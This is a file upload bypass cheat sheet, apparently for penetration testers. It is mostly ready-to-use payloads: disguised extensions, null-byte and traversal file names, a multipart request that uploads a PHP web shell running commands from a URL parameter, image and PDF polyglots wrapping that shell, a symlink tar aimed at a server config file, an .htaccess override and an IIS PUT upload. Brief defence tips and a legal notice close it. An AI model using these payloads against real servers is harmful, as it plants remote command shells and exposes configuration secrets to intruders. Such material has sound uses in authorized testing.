# **File Upload Bypass Payload Cheat Sheet**

This document contains comprehensive techniques to bypass file upload restrictions during security testing.

## **1. Basic File Upload Bypasses**

### **Extension Obfuscation**
```
shell.php
shell.php5
shell.pHp
shell.php.
shell.php%00.jpg
shell.php\x00.jpg
shell.php/
shell.php\\
shell.phar
```

### **Double Extension**
```
shell.jpg.php
shell.png.pHp5
shell.pdf.php7
```

### **Case Manipulation**
```
sHell.PHp
SHELL.phP5
```

## **2. Content-Type Bypasses**

### **Image MIME Types**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

### **Common MIME Types to Try**
```
image/jpeg
image/png
application/pdf
text/plain
application/octet-stream
```

## **3. Magic Byte Bypasses**

### **PNG Header Bypass**
```hex
‰PNG
<?php system($_GET['cmd']); ?>
```

### **GIF Header Bypass**
```hex
GIF89a;
<?php system($_GET['cmd']); ?>
```

## **4. Advanced Bypass Techniques**

### **Null Byte Injection**
```
shell.php%00.jpg
shell.php\x00.png
```

### **Path Traversal in Filename**
```
../../../shell.php
..\..\..\shell.php
```

### **Overlong UTF-8 Sequences**
```
shell.%c0%80php
shell.%e0%80%80php
```

## **5. Archive Upload Bypasses**

### **ZIP with Malicious File**
```bash
zip malicious.zip shell.php -r ../uploads/
```

### **Tar with Symlink**
```bash
ln -s /var/www/html/config.php evil
tar -cvf payload.tar evil
```

## **6. Polyglot Files**

### **PDF-PHP Polyglot**
```hex
%PDF-1.4
<?php system($_GET['cmd']); ?>
```

### **GIF-JS Polyglot**
```javascript
GIF89a=0;
alert(1);/*
```

## **7. Server-Specific Bypasses**

### **Apache .htaccess Bypass**
```
.htaccess:
AddType application/x-httpd-php .jpg
```

### **IIS PUT Method**
```http
PUT /shell.aspx HTTP/1.1
Host: target.com
Content-Length: 25

<% Response.Write("test") %>
```

## **8. Blacklist Bypass Extensions**

### **PHP Alternatives**
```
.pht, .phpt, .pgif, .phps, .phtml
.inc, .hphp, .ctp, .module
```

### **Other Executable Extensions**
```
.jsp, .jspx, .war
.aspx, .asmx, .ashx
.py, .pl, .cgi
```

## **9. Testing Methodology**

1. **Verify allowed extensions** (try all variations)
2. **Check MIME validation** (Content-Type manipulation)
3. **Test file content validation** (magic bytes)
4. **Attempt path traversal** (directory climbing)
5. **Verify server parsing** (polyglot files)
6. **Check archive handling** (ZIP/TAR uploads)

## **10. Defense Recommendations**

- Use whitelisting instead of blacklisting
- Rename uploaded files
- Store files outside webroot
- Use proper Content-Type validation
- Scan files for malicious content
- Set proper file permissions

## **Legal Notice**

These techniques should only be used for authorized security testing. Unauthorized testing may violate laws and system policies. Always obtain proper permission before testing.